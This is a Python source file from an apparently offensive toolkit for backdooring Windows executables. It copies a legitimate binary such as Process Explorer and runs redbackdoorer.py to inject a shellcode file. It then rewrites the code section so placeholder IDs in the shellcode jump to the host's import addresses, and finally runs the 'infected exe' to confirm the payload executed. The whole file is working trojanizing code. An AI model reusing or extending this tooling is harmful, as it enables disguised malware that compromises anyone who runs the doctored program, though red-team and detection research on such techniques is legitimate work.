from helper import *
import shutil
import pprint
from pehelper import *

def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities):
    print("--[ Injecting: {} into: {} -> {} ]".format(
        shc_file, exe_in, exe_out
    ))
    shutil.copyfile(exe_in, exe_out)

    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
    subprocess.run([
        "python3.exe",
        "redbackdoorer.py",
        mode,
        shc_file,
        exe_out
    ], check=True,  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


    # get code section
    #   get offset from start of code
    #   get offset of code setion?

    ####
    print("-------------")
    #pprint.pprint(exe_capabilities)
    for cap in exe_capabilities:
        print("-> 0x{:X}\t\t{}".format(
            exe_capabilities[cap]["addr"],
            cap,
            #exe_capabilities["id"],
        ))
    print("-------------")
    code = get_code_section(exe_out)

    # replace IAT in shellcode
    for cap in exe_capabilities:
        #print("AAAA: " + str(cap))
        if not exe_capabilities[cap]["id"] in code:
            print("Not found, abort")
            raise Exception()
        
        off = code.index(exe_capabilities[cap]["id"])
        current_address = off + 0x140000000 + 4096

        print(" Off: 0x{:X}".format(off))
        print(" Off2: 0x{:X}".format(current_address)) # base addr
        #print(" Diff: 0x{:X}".format())

        destination_address = exe_capabilities[cap]["addr"]

        jmp = assemble_and_disassemble_jump(
            current_address, destination_address
        )
        print("ONE: {}".format(jmp))
        print("TWO: {}".format(exe_capabilities[cap]["id"]))

        print("Found! replacing")
        code = code.replace(
            exe_capabilities[cap]["id"], jmp)
        write_code_section(exe_out, code)


def verify_injected_exe(exefile):
    print("---[ Verify infected exe: {} ]".format(exefile))
    # remove indicator file
    pathlib.Path(verify_filename).unlink(missing_ok=True)

    subprocess.run([
        exefile,
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # , check=True
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(verify_filename)
        return True
    else:
        print("---> Verify FAIL. Infected exe does not work (no file created)")
        return False

